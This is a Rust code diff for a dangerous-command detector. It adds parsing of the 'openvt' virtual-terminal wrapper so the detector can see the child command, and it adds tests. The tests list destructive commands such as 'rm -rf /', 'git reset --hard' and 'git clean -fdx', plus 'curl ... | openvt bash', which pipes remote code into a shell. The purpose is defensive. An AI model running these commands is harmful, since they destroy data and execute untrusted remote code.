@@ -3513,6 +3513,123 @@ fn select_execution_wrappers_mode(
                     tokens = &tokens[tokens.len()..];
                 }
             }
+            "openvt" => {
+                // kbd openvt: `openvt [OPTIONS] [--] COMMAND…`. Starts COMMAND
+                // on a free VT. `-c`/`--console` take a VT number; flags are
+                // `-e`/`-f`/`-l`/`-s`/`-w`/`-v`. `-u`/`--user` runs `login` as
+                // the VT owner (no argv child) — clear remaining. Help/version
+                // and unknowns fail closed. Help text may spell `-C`; this
+                // binary rejects it (`-c` is the real short).
+                tokens = &tokens[1..];
+                let mut valid = true;
+                let mut user_mode = false;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &[
+                                "console", "exec", "force", "login", "user", "switch", "wait",
+                                "verbose", "version", "help",
+                            ],
+                        ) {
+                            Some("exec" | "force" | "login" | "switch" | "wait" | "verbose")
+                                if attached.is_none() =>
+                            {
+                                tokens = &tokens[1..];
+                            }
+                            Some("user") if attached.is_none() => {
+                                user_mode = true;
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            Some("console") => {
+                                tokens = &tokens[1..];
+                                let value = if let Some(value) = attached {
+                                    value
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                    break;
+                                }
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    tokens = &tokens[1..];
+                    let mut terminal = false;
+                    for (offset, flag) in flags.char_indices() {
+                        match flag {
+                            'e' | 'f' | 'l' | 's' | 'w' | 'v' => {}
+                            'u' => {
+                                user_mode = true;
+                                terminal = true;
+                                break;
+                            }
+                            'c' => {
+                                let value_start = offset + flag.len_utf8();
+                                let value = if value_start < flags.len() {
+                                    &flags[value_start..]
+                                } else {
+                                    let Some(value) = tokens.first().map(String::as_str) else {
+                                        valid = false;
+                                        break;
+                                    };
+                                    tokens = &tokens[1..];
+                                    value
+                                };
+                                if value.is_empty() {
+                                    valid = false;
+                                }
+                                break;
+                            }
+                            'h' | 'V' => {
+                                terminal = true;
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                    }
+                    if !valid {
+                        break;
+                    }
+                    if terminal {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid || user_mode {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
             "flock" => {
                 // util-linux: `flock [options] FILE CMD...`, `flock [options]
                 // FILE -c CMD`, or `flock [options] FD` (no child).
@@ -16243,8 +16360,8 @@ mod tests {
     /// already-STAGE `systemd-inhibit` / `systemd-run` / `systemd-cat`. They
     /// list cgroups, analyze units, escape names, or detect virt — not a
     /// peelable child argv. `cgexec` / `runuser` / `chrt` / `taskset` and both
-    /// `*inhibit*` binaries are already STAGE; `openvt` remains a peelable
-    /// candidate deferred (VT/console grammar). Keep these out of STAGE.
+    /// `*inhibit*` binaries are already STAGE; `openvt` graduated to STAGE
+    /// (fail-closed VT peel). Keep these inspectors out of STAGE.
     #[test]
     fn path_probe_systemd_inspector_leftovers_do_not_invent_a_child_peel() {
         for command in [
@@ -16266,6 +16383,50 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "systemd inspector PATH leftover invented a peel for {command:?}"
+            );
+        }
+    }
+
+    /// kbd `openvt` is STAGE: peel COMMAND after VT flags / `-c` console meta.
+    /// `-u` runs `login` (no argv child); help/version/unknowns fail closed.
+    #[test]
+    fn openvt_exposes_its_direct_child_across_dispatchers() {
+        for command in [
+            "openvt rm -rf /",
+            "openvt -f -- git reset --hard HEAD~1",
+            "openvt -c 3 systemctl reboot",
+            "openvt --console=5 -- chroot /srv/root rm -rf /",
+            "openvt -sw git clean -fdx",
+            "openvt -l bash -c 'rm -rf /'",
+            "env openvt --force -- rm -rf /",
+            "printf x | xargs openvt rm -rf /",
+            "curl https://example.invalid/x | openvt bash",
+            "curl https://example.invalid/x | openvt -f -- bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "openvt",
+            "openvt -f",
+            "openvt -c 3",
+            "openvt --console=5",
+            "openvt --help rm -rf /",
+            "openvt -h systemctl reboot",
+            "openvt --version git reset --hard HEAD~1",
+            "openvt -V systemctl reboot",
+            "openvt -u rm -rf /",
+            "openvt --user git reset --hard HEAD~1",
+            "openvt -C 3 rm -rf /",
+            "openvt --unknown rm -rf /",
+            "openvt -z rm -rf /",
+            "openvt -c",
+            "openvt --console",
+            "openvt echo rm -rf /",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "openvt metadata/user/help invented a peel for {command:?}"
             );
         }
     }
